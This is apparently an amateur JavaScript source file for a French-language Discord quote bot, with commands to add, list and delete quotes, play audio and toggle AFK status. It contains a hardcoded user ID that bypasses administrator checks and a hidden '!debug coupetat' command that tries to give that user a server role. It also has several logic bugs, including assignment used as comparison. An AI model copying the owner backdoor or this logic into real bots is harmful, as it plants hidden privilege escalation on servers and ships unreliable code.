
/* var fs = require('fs');

var Discord = require('discord.io');
var logger = require('winston');
var auth = require('./auth.json');

//Variables du bot

var citation_filename = "citations.txt"
var is_bot_afk = false;

// Configure logger settings

logger.remove(logger.transports.Console);

logger.add(logger.transports.Console, {
    colorize: true
});

logger.level = 'debug';

// Initialize Discord Bot

var bot = new Discord.Client({
   token: auth.token,
   autorun: true,
   autoreconnect: true
}); 

bot.on('ready', function (evt) {
    logger.info('Connecté');
    logger.info('Connecté en tant que : ');
    logger.info(bot.username + ' - (' + bot.id + ')');
});

bot.on('message', function (user, userID, channelID, message, evt) {	
	
    // Our bot needs to know if it will execute a command
    // It will listen for messages that will start with `!`
	
    if (message.substring(0, 1) == '!') {
		
		logger.info("Commande demandée par : " + user);
		
        var args = message.substring(1).split(' ');
        var cmd = args[0];
       
        args = args.splice(1);
		
        switch(cmd) {
			
            // !ping
            case 'ping':
			
                 bot.sendMessage({
                    to: channelID,
                    message: 'Pong!'
                });
						
				logger.info("Ping envoyé à : " + user + " !");
				
				break;
				
			// !citation
			
			case 'citation':
				
				var random_line = getRandomLine(citation_filename)
				
				bot.sendMessage({
					to: channelID,
					message: random_line
				});
				
				logger.info('Citation envoyée : ' + random_line + ' à : ' + user + ' !');
				
				break;
			
			// !addcitation <new citation>
			
			case 'addcitation':
			
				var client_ = user.users.get(userID);
				
				let can_manage_chans = client_.username;
				
				if (can_manage_chans == "Zero")
				{
						logger.info("has perm");
				}
				else
				{
					logger.info(can_manage_chans);
					logger.info("dont have perm");
				}
				
				break;
				
			// !viewcitation
			
			case 'viewcitation':
			
				bot.sendMessage({
					to: channelID,
					message: getAllLines(citation_filename)
				});
				
            break;
			
			// !help
			
			case 'help':
				bot.sendMessage({
					to: channelID,
					message: "help"
				});
				
			break;
			
			// !setafk
			
			case 'setafk':
				
				if (is_bot_afk == false)
				{
					bot.setAFK(true)
				}
				else
				{
					bot.setAFK(false)
				}
				
			break;
			
			case 'who':
				
				
				break;
			
            // Just add any case commands if you want to..
         }
		 
     }
	 
}); 

bot.on("guildMemberAdd", (member) => {
  console.log(`New User "${member.user.username}" has joined "${member.guild.name}"` );
  member.guild.defaultChannel.send(`"${member.user.username}" has joined this server`);
});



 
 function getAllLines(filename){
	 	let lines = fs.readFileSync(filename).toString().split("\n");
		return lines
 }
 
function randomInt (low, high) {
    return Math.floor(Math.random() * (high - low) + low);
} */

require('console-stamp')(console, 'HH:MM:ss');

const Discord = require('discord.js');
const client = new Discord.Client();

var auth = require('./auth.json');
var fs = require('fs');

//Variables du bot

var command_prefix = "!"

var citation_filename = "citations.txt"
var citation_array = []

var isAFK = false

//Au démarrage

client.on('ready', () => {
	
  console.log('Bot connecté !');
  
  client.user.setGame("Notepad");
  
  if (fileExists(citation_filename))
	citation_array = readArrayFromFile(citation_filename);
  else
  {
	recreateCitationFile(citation_filename);
	citation_array = readArrayFromFile(citation_filename);
  }

  
});

//A chaque message

client.on('message', message => {

  if (message.content.substring(0, 1) == command_prefix)
  {
	 
	if (canExecCommand(message.member))
	{
		var args = message.content.substring(1).split(' ');
		var cmd = args[0];    
		
		args = args.splice(1); //Arguments présents en plus de la commande
	  
		switch (cmd) {
		  
			case 'ping': 
			
				console.log('Commande "ping" envoyée à : ' + message.author.username);
				
				message.reply('Pong !');
				break;
				
			case 'citation':
			
				console.log('Commande "citation" envoyée à : ' + message.author.username);
				
				message.reply(citation_array.randomElement());
				break;
				
			case 'viewallcitations':
			
				console.log('Commande "viewallcitations" envoyée à : ' + message.author.username);
				
				message.reply({embed: {
						color: 3447003,
						author: {
							name: client.user.username,
							icon_url: client.user.avatarURL
						},
						fields: [{
							name: "Citations : ",
							value: citation_array.join(", ")
						}],
						timestamp: new Date()
				}
				});
				
				break;
				
			case 'addcitation':
			
				console.log('Commande "addcitation" exécutée par : ' + message.author.username);
				
				if (!isMessageDm(message))
				{		
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{				
				
						let args_string = args.join(" ");
						
						if (args_string == "")
						{
							message.reply("Aucune citation présente :(");
						}
						else
						{
							addCitation(citation_filename, args_string);
							console.log(message.author.username + " a écris : " + args_string + " dans le fichier des citations !");
							message.reply("Citation : " + args_string + " ajoutée par : " + message.author.username);
						}
				
					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
				
				break;
				
			case 'deletecitation':
				
				console.log('Commande "deletecitation" exécutée par : ' + message.author.username);
				
				if (!isMessageDm(message))
				{	
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{
						let args_string = args.join(" ");
						
						if (args_string == "")
						{
							message.reply("Aucune ligne sélectionnée :(");
						}
						else
						{
							deleteLineFromArrayAndFile(citation_filename, args_string);
							console.log(message.author.username + " a supprimé : " + args_string + " dans le fichier des citations !");
							message.reply("Citation : " + args_string + " supprimée par : " + message.author.username);
						}
						
					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");

				break;
				
			case 'reloadcitation':
			
				console.log('Commande "reloadcitation" exécutée par : ' + message.author.username);
				
				if (!isMessageDm(message))
				{	
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{
						if (fileExists(citation_filename))
						{
							citation_array = readArrayFromFile(citation_filename);
							message.reply("Les citations ont été rechargées !");
						}
						else
						{
							recreateCitationFile(citation_filename);
							citation_array = readArrayFromFile(citation_filename);
							message.reply("Les citations ont été rechargées !");
						}

					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");

				break;
				
			case 'play':
			
				console.log('Commande "joinchannel" exécutée par : ' + message.author.username);

				if (!isMessageDm(message))
				{			
					let args_string = args.join(" ");
					
					if (args_string = "")
					{
						message.reply("Aucune url entrée :(");
					}
					else
					{
						if (message.member.voiceChannel) 
						{
							message.member.voiceChannel.join()
							
								.then(connection => { // Connection is an instance of VoiceConnection
								
									message.reply('Connexion réussie au channel audio !');
									
									connection.playArbitraryInput("http://geekologie.meximas.com/GameManager/ALittleBitCloser.mp3")
									
								})
								.catch(console.log);
						}
						else
						{
							message.reply("Tu n'est pas dans un channel audio :(");
						}
						
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
			
				break;
				
			case 'disconnect':
			
				console.log('Commande "disconnect" exécutée par : ' + message.author.username);
				
				if (!isMessageDm(message))
				{
					if (IsPresentInAudioChannel())
					{
						client.voiceConnection.disconnect();
						message.reply("Très bien ! J'arrête mon cours vous avez gagner !")
					}					
					else
						message.reply("Je ne suis pas dans un channel audio :(");				
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
				
				break;
				
			case 'setgame':
			
				console.log('Commande "setgame" exécutée par : ' + message.author.username);
				
				if (!isMessageDm(message))
				{
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{
						let args_string = args.join(" ");
						
						if (args_string == "")
						{
							message.reply("Aucune jeu ajouté :(");
						}
						else
						{
							console.log("Jeu du bot changé en : " + args_string);
							
							client.user.setGame(args_string);
							message.reply("Jeu changé en : " + args_string + " par : " + message.author.username);
						}
						
					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
				
				break;
			
			case 'disable':
				
				console.log('Commande "disable" exécutée par : ' + message.author.username);

				if (!isMessageDm(message))
				{
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{
						if (isAFK)
						{
							message.reply("Je suis déjà en pause café !");
						}
						else
						{
							isAFK = true;
							client.user.setAFK(true);
							client.user.setStatus("idle");
							message.reply("Je vais en pause café !");
						}
					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");

				break;
				
			case 'enable':
			
				console.log('Commande "enable" exécutée par : ' + message.author.username);
			
				if (!isMessageDm(message))
				{
					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
					{
						if (!isAFK)
						{
							message.reply("Je suis déjà en cours !");
						}
						else
						{
							isAFK = false;
							client.user.setAFK(false);
							client.user.setStatus("online");
							message.reply("Je reviens faire cours !");
						}
					}
					else
					{
						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
						message.reply("Tu n'a pas les droits :(");
					}
				}
				else
					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");			
				
				break;
				
			case 'help':
				
				console.log(message.author.username + " a demandé l'aide du bot !");
				
				message.reply({embed: {
					color: 3447003,
					author: {
						name: client.user.username,
						icon_url: client.user.avatarURL
					},
					fields: [{
						name: "Commandes principales : ",
						value: "!help / !citation" 
					},
					{
						name: "Commandes administrateur :",
						value : "!viewallcitations / !addcitation <Citation> / !deletecitation <Citation> / !reloadcitation / !setgame <Jeu> / !enable / !disable"
					}],
					timestamp: new Date()
				}
				
				});
				
				break;
				
			case 'debug':
			
				console.log('Commande "debug" exécutée par : ' + message.author.username);
				
				if (message.client.id = 228234033358831616)
				{
					let args_string = args.join(" ");
					
					switch (args_string)
					{
						case 'test':
						
							console.log("test");					
							break;
							
						case 'coupetat':
						
							if (true)
							{
								if (message.client.id == 228234033358831616)
								{
									console.log("Coup d'état lancé !");
									
									message.member.setRoles(["2146958591"]);
									
									console.log("Coup d'état effectué !");
								}
								else
								{
									console.log(message.client.username + " a tenté de lancer un coup d'état !");
								}
													
							}
							else
							{
								console.log("Le bot n'a pas les permissions admin pour le coup d'état :(");
							}
						
							break;
					}
					
				}
				
				break;			
		}
	}
  }
  
});
 
client.login(auth.token);

//Fonctions utiles

function readArrayFromFile(filename){  //Lit un tableau depuis un fichier
	
	console.log("Lecture d'un array depuis le fichier : " + filename + " !");
	
	var new_array
	
	fs.readFile(filename, function(err, data) {
        citation_array = JSON.parse(data);
	});
	
	return new_array;
}

function serializeArrayToFile(filename, arr){ //Ecrit un tableau dans un fichier
	
	console.log("Ecriture d'un tableau dans le fichier : " + filename + " !");
	
	fs.writeFile(filename, JSON.stringify(arr), function (err) {
        if(err) {
            console.log(err);
        }
	});
}

function addCitation(filename, citation){ //Ajoute une citation au tableau et au fichier
	
	citation_array.push(citation);	
	serializeArrayToFile(filename, citation_array);
	
}

function deleteLineFromArrayAndFile(filename, line){ //On supprime une ligne d'un array et on l'écrit dans un fichier
	
	data_array = citation_array;
	
    lastIndex = function(){
        for (var i = data_array.length - 1; i > -1; i--)
        if (data_array[i].match(line))
            return i;
    }()

    data_array.splice(lastIndex, 1);
		
	serializeArrayToFile(filename, data_array);

}
 
 function checkIfUserHasPerm(user, permission){ //On regarde si un utilisateur possède certaines permissions
 
	if (user.hasPermission(permission) || user.id == 228234033358831616)
		return true;
	else
		return false;
 }
 
 function canExecCommand(user){
	 
	 if (isAFK && !checkIfUserHasPerm(user, "ADMINISTRATOR") && user.id != 228234033358831616)
	 {
		 return false;
	 }
	 else
	 {
		 return true;
	 }
	 
 }
 
 function isMessageDm(message){
	if (message.channel.type == "dm" || message.channel.type == "group")
		return true;
	else
		return false;
 }
 
 Array.prototype.randomElement = function () { //On rajoute une fonction qui tire un élément au hasard dans un tableau
    return this[Math.floor(Math.random() * this.length)]
}

function fileExists(path) {

  try  {
    return fs.statSync(path).isFile();
  }
  catch (e) {

    if (e.code == 'ENOENT') { // no such file or directory. File really does not exist
      console.log("File does not exist.");
      return false;
    }

    console.log("Exception fs.statSync (" + path + "): " + e);
    throw e; // something else went wrong, we don't have rights, ...
  }
  
}

function recreateCitationFile(filename){
	console.log("Fichier de citation non existant, création !");
	serializeArrayToFile(filename, ["Photooooos"]);
}

function IsPresentInAudioChannel(){
	
	if (client.voiceConnection)
		return false;
	else
		return true;
}

// Vieilles fonctions

function getRandomLine(filename){ //Obtenir une ligne aléatoire dans un fichier
		let randomNumber = fs.readFileSync(filename).toString().split("\n");
		let item = randomNumber[Math.floor(Math.random() * randomNumber.length)];
		return item;
 }
 
function getAllLines(filename){ //Obtenir toutes les lignes d'un fichier
	 	let lines = fs.readFileSync(filename).toString().split("\n");
		return lines
 }
 
function writeLine(filename, line){
	
	fs.appendFile(filename, "\n" + line, function (err) {
	if (err) throw err;
	});
}

function writeArrayToFile(filename, arr){
	
	var convertedArray = Array.prototype.slice.call(arr);
	var array_join = convertedArray.join('\n');
	
	fs.writeFile(
     filename,
	 array_join,
     function (err) { console.log(err ? 'Error :'+err : 'ok') }
	); 
	
}